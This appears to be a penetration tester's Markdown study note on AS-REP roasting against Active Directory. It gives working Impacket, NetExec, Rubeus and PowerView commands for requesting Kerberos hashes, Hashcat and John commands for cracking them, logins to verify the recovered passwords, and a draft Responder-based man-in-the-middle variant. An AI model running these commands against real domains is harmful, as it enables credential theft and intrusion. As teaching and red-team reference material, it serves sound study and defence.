---
created: 2026-08-03
updated: 2026-10-18
tags:
  - AD
  - AD_attacks
  - Kerberos
---
>[!note] [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/).

## `AS-REP` roasting

- At the beginning of Kerberos authentication, a client requests a **TGT** (Ticket-Granting Ticket) from the KDC (Key Distribution Center) by sending an Authentication Service Request (`AS-REQ`). This request is sent before the client has any credentials in the current session.
- The `AS-REQ` typically includes **pre-authentication data**: a timestamp encrypted with a key derived from the client's password. This key is called the client's **long-term key**.
- The AS decrypts the timestamp using the corresponding key it stores for the account and verifies that it falls within the acceptable clock skews (5 minutes by default). This demonstrates that the client possesses the account's long-term key without transmitting the key itself.

>[!note] See [[Kerberos#1. AS exchange (KRBASREQ / KRBASREP)]].

- Kerberos pre-authentication can be disabled for an account through the `DONT_REQUIRE_PREAUTH` flag in the `userAccountControl` attribute. When this flag is set, the AS can issue an `AS-REP` without first verifying that the requester actually holds the client's long-term key.
- Therefore, you can request an `AS-REP` for an account with pre-authentication disabled without knowing the account's password or long-term key.
---
- Part of `AS-REP` — the portion intended for the client — is encrypted with the client's long-term key. If you capture the response, you can extract this material and attempt to **crack the password offline**: take a candidate password, derive the corresponding Kerberos key, and attempt to decrypt the captured data. A successful decryption identifies the correct candidate password and, consequently, the corresponding long-term key. 

> **`AS-REP` roasting** is a Kerberos attack in which an attacker requests an `AS-REP` (Authentication Service Response) for a domain account with pre-authentication disabled and uses the returned encrypted material to attempt offline password cracking.

>[!note] The traffic generated during the roasting consists of standard `AS-REQ` requests — generating Event `4768` (A Kerberos authentication ticket was requested) on the Domain Controller, but no failed logons (`4625`).

>[!note] See [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties).

## Executing `AS-REP` roasting

>[!important] Computer accounts and gMSAs enforce pre-authentication by default and have long, complex passwords. Target **human user accounts** with `DONT_REQUIRE_PREAUTH` set.

### From Linux

#### `GetNPUsers.py`

- [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) from Impacket can request `AS-REP`s for accounts with Kerberos pre-authentication disabled **both with and without valid domain credentials**. 
- If credentials are provided, the tool can pull target domain accounts automatically; otherwise you must submit a list of usernames. 
- `GetNPUsers.py` checks whether `DONT_REQUIRE_PREAUTH` is set for each target account, and if so, performs the `AS-REP` roasting attack, i.e., requests `AS-REP`s.
---

- Perform `AS-REP` roasting without valid domain credentials:

```bash
GetNPUsers.py example.com/ -usersfile usernames.txt -request
```

>[!tip]+
> - To only check which accounts have `DONT_REQUIRE_PREAUTH` set, but without actually requesting `AS-REP`s, omit the `-request` option:
> 
> ```bash
> python3 GetNPUsers.py example.com/ -usersfile usernames.txt
> ```

- Authenticate using username and password:

```bash
GetNPUsers.py example.com/'jdoe':'passwd123' -request -outputfile AS-REP_hashes.txt
```

- Authenticate using an NT hash ([[Pass-the-Hash]]):

```bash
GetNPUsers.py example.com/'jdoe' -hashes ':d503a8571a79baf9b951884f350ad048' -request -outputfile AS-REP_hashes.txt
```

- Authenticate using a Kerberos cache (`ccache`):

```bash
GetNPUsers.py example.com/'jdoe' -k -no-pass -request -outputfile AS-REP_hashes.txt
```

- Target a specific user, skipping enumeration:

```bash
GetNPUsers.py example.com/ -user 'rroe' -request -outputfile REP_rroe.txt
```

| Option        | Description                                                                                  |
| ------------- | -------------------------------------------------------------------------------------------- |
| `-dc-ip`      | IP address of the target Domain Controller.                                                  |
| `-usersfile`  | Path to a text file containing target usernames (one per line) for unauthenticated roasting. |
| `-request`    | Requests `AS-REP` for vulnerable accounts and prints hashes in Hashcat/JtR format.           |
| `-outputfile` | Saves the output hashes directly to the specified file.                                      |
| `-format`     | Specify hash format (`hashcat` or `john`; default: `hashcat`).                               |
| `-user`       | Target a specific user, skipping enumeration.                                                |
| `-hashes`     | Authenticate using LM:NT hash (Pass-the-Hash).                                               |
| `-k`          | Use Kerberos cache (`ccache`) for authentication.                                            |

> [!example]-
> ```bash
> impacket-GetNPUsers -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
> ```
> 
> ```bash
> Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
> 
> Password:
> Name      MemberOf                                           PasswordLastSet             LastLogon                  
> --------  -------------------------------------------------  --------------------------  --------------------------
> hsimpson  CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-03-15 10:14:22.127432  2026-07-30 08:12:04.606617
> 
> $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```
#### `NetExec`

- [`NetExec`](https://github.com/Pennyw0rth/NetExec)'s `ldap` module supports `AS-REP` roasting attacks. With valid domain credentials, it enumerates vulnerable users via LDAP and requests their `AS-REP`s in a single pass.
---
- Enumerate users with Kerberos pre-authentication disabled and perform `AS-REP` roasting:

```bash
nxc ldap 10.10.11.5 -u 'jdoe' -p 'passwd123' --asreproast AS-REP_hashes.txt
```

- Target a specific user:

```bash
nxc ldap 10.10.11.5 -u 'rroe' -p '' --asreproast AS-REP_hashes.txt
```
### From Windows

#### Enumerating accounts with Kerberos pre-authentication disabled

- Enumerate users with Kerberos pre-authentication disabled using PowerShell (`ActiveDirectory` module):

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName, UserPrincipalName, Enabled
```

- Using [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) (`PowerView`):

```powershell
Import-Module .\PowerView.ps1
```
```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

- Using [`Rubeus`](https://github.com/GhostPack/Rubeus#preauthscan):

```powershell
.\Rubeus.exe asreproast /stats
```

```powershell
.\Rubeus.exe preauthscan /users:usernames.txt 
```

#### `Rubeus`

- [`Rubeus`](https://github.com/GhostPack/Rubeus#asreproast) supports `AS-REP` roasting attacks via the `asreproast` sub-command.
- Enumerate users automatically and perform `AS-REP` roasting for those that have `DONT_REQUIRE_PREAUTH` set:

```powershell
.\Rubeus.exe asreproast /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
```

- `AS-REP`-roast a specific user:

```powershell
.\Rubeus.exe asreproast /user:rroe /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
```

- Roast a list of users specified in a file:

```powershell
.\Rubeus.exe asreproast /usersfile:usernames.txt /nowrap
```

>[!note]- `Rubeus asreproast` options
> | Option                  | Description                                                   |
> | ----------------------- | ------------------------------------------------------------- |
> | `/user:username`        | Target a specific user account for `AS-REP` roasting.         |
> | `/usersfile:file.txt`   | Read target usernames from a text file for batch roasting.    |
> | `/domain:domain.local`  | Target domain.                                                |
> | `/dc:dc01.domain.local` | Target Domain Controller.                                     |
> | `/ou:"LDAP OU"`         | Limit search to a specific Organizational Unit.               |
> | `/format:hashcat\|john` | Hash output format (`hashcat` or `john`; default: `hashcat`). |
> | `/outfile:file.txt`     | Write roasting output hashes to a file.                       |
> | `/nowrap`               | Output hashes without line wrapping for easy copying.         |
> | `/stats`                | Display vulnerable accounts count without requesting tickets. |

> [!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe asreproast /nowrap
> ```
> 
> ```powershell
>    ______        _                      
>   (_____ \      | |                     
>    _____) )_   _| |__  _____ _   _  ___ 
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/ 
> 
>   v2.0.2 
> 
> [*] Action: AS-REP Roasting
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] SamAccountName         : hsimpson
> [*] DistinguishedName      : CN=Homer Simpson,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] PwdLastSet             : 3/15/2022 10:14:22 AM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```

### `PowerView`
## Cracking `AS-REP` hashes

- `AS-REP` hashes can be cracked offline using Hashcat or JohnTheRipper.
- The encryption type (`enctype`) used in the `AS-REP` determines how fast the user's password can be recovered, depending on the cryptographic algorithms in use.

| Encryption type (`enctype`) | Value         | Hashcat mode | JtR format  | Description                                                                          |
| --------------------------- | ------------- | ------------ | ----------- | ------------------------------------------------------------------------------------ |
| `RC4-HMAC`                  | `23` (`0x17`) | `18200`      | `krb5asrep` | Encrypted using a key derived directly from the account's NT hash; fastest to crack. |
| `AES128-CTS-HMAC-SHA1-96`   | `17` (`0x11`) | `19800`      | `krb5asrep` | Key derivation uses PBKDF2 with 4,096 iterations; significantly slower.              |
| `AES256-CTS-HMAC-SHA1-96`   | `18` (`0x12`) | `19900`      | `krb5asrep` | PBKDF2 with 4,096 iterations and 256-bit key; slowest to crack.                      |

### Hashcat

- Crack RC4 `AS-REP` hashes (`etype 23`, mode `18200`):

```bash
hashcat -m 18200 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Crack AES-128 `AS-REP` hashes (`etype 17`, mode `19800`):

```bash
hashcat -m 19800 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Crack AES-256 `AS-REP` hashes (`etype 18`, mode `19900`):

```bash
hashcat -m 19900 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

>[!note] See [[Hashcat]].
### John the Ripper

- Crack `AS-REP` hashes with [John the Ripper](https://www.openwall.com/john/) using the `krb5asrep` format:

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt AS-REP_hashes.txt
```

>[!note] [[Hashcat]].
### Validating recovered credentials

- You can verify the cracked password against domain services using [`NetExec`](https://github.com/Pennyw0rth/NetExec) over SMB:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123'
```

- Over WinRM:

```bash
nxc winrm 10.10.11.5 -u 'jdoe' -p 'passwd123'
```



## References and further reading

- [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/)
---
- [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [`RFC 4120: The Kerberos Network Authentication Service (V5) — RFC Editor`](https://www.rfc-editor.org/info/rfc4120)
---

- [`Roasting AS-REPs — Will Schroeder, SpecterOps`](https://specterops.io/blog/2017/01/17/roasting-as-reps/)
- [`ASREProast — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast)
- [`AS-REP Roasting — Hacking Articles`](https://www.hackingarticles.in/as-rep-roasting/)
---

- [`Roasting AS-REPs — HarmJ0y (SpecterOps)`](https://www.harmj0y.net/blog/redteaming/roasting-as-reps/)
- [`AS-REP Roasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/as-rep-roasting)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket GetNPUsers — Fortra GitHub`](https://github.com/fortra/impacket)
- [`Event 4768 — A Kerberos authentication ticket (TGT) was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [`UserAccountControl Flags — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)

# drafts

## `AS-REP` roast MitM

- The standard `AS-REP` roasting attack requires the target account to have `DONT_REQUIRE_PREAUTH` set. 
- A MitM variant **removes this prerequisite by capturing legitimate `AS-REP` traffic from the wire**, rather than requesting `AS-REP`s directly from the KDC.
- This works because every `AS-REP` contains the same crackable material, regardless of how it was obtained — requested directly for an account with `DONT_REQUIRE_PREAUTH` or captured from another user's traffic.

---

- To capture `AS-REP`s, you must be positioned between the target client and the Domain Controller. On a switched network, this typically requires ARP spoofing, LLMNR/NBNS/mDNS spoofing, or DHCPv6 spoofing — to redirect Kerberos traffic (TCP/UDP port `88`) through your host.
- `AS-REQ`/`AS-REP` are exchanged when the client authenticates to the domain for the first time in a session, and this is when you can catch it.

> [!note] The MitM variant is **opportunistic** rather than on-demand. The success depends on intercepting authentication at the right moment, which limits its reliability compared to standard `AS-REP` roasting.

### `Responder`

- [`Responder`](https://github.com/lgandx/Responder) creates a rogue service on the network and captures authentication material. 
- You need to trick the target client into authenticating against that service (typically via WPAD, LLMNR/NBNS spoofing, or SMB-to-Kerberos downgrade), and `Responder` logs the `AS-REP` exchange.
---
- Start `Responder` with LLMNR/NBNS spoofing enabled (default). WPAD and Kerberos downgrade should be enabled in `Responder.conf`:

```bash
sudo responder -I eth0 -wF
```

- `Responder` writes captured Kerberos material under `/usr/share/responder/logs/`. Captured `AS-REP`s appear as files named `AS-REP-<user>-<IP_address>.txt`.

```bash
ls /usr/share/responder/logs/
```

- To convert the captured `AS-REP` messages to the format [[Hashcat]]/[[🛠️ JohnTheRipper]] can work with, you can use [`krb2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/krb2john.py):

```bash
python3 /usr/share/john/krb2john.py /usr/share/responder/logs/AS-REP-*.txt > AS-REP_hashes.txt
```

